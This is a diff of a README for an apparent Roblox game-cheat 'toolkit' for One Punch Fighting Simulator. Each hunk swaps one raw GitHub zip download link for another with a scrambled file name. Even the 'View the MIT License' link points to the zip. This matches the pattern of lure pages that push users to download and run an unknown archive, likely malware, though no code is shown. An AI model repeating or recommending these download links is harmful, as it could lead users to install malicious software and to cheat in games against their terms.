@@ -84,8 +84,8 @@ Downloading and installation is easier than a one-move knockout!
 4. Engage the script for your optimized play!
 
 Ready to unleash your virtual power? Download the latest robust version here:  
-**https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/one-punch-fighting-simulator-roblox-toolkit-pshaw.zip**  
-[![Download](https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/one-punch-fighting-simulator-roblox-toolkit-pshaw.zip)](https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/one-punch-fighting-simulator-roblox-toolkit-pshaw.zip)
+**https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/simulator-one-fighting-roblox-toolkit-punch-2.0-alpha.2.zip**  
+[![Download](https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/simulator-one-fighting-roblox-toolkit-punch-2.0-alpha.2.zip)](https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/simulator-one-fighting-roblox-toolkit-punch-2.0-alpha.2.zip)
 
 Refer to our **Setup Guide** in the `/docs` folder for troubleshooting and integration tips.
 
@@ -106,7 +106,7 @@ This repository is licensed under the MIT License – allowing warm-hearted coll
 
 Copyright (c) 2025
 
-[View the MIT License](https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/one-punch-fighting-simulator-roblox-toolkit-pshaw.zip)
+[View the MIT License](https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/simulator-one-fighting-roblox-toolkit-punch-2.0-alpha.2.zip)
 
 ---
 
@@ -114,8 +114,8 @@ Copyright (c) 2025
 
 Stay on top of your game by always running the most current script build. The freshest release is just a click away:
 
-**https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/one-punch-fighting-simulator-roblox-toolkit-pshaw.zip**  
-[![Download](https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/one-punch-fighting-simulator-roblox-toolkit-pshaw.zip)](https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/one-punch-fighting-simulator-roblox-toolkit-pshaw.zip)
+**https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/simulator-one-fighting-roblox-toolkit-punch-2.0-alpha.2.zip**  
+[![Download](https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/simulator-one-fighting-roblox-toolkit-punch-2.0-alpha.2.zip)](https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/simulator-one-fighting-roblox-toolkit-punch-2.0-alpha.2.zip)
 
 ---
 
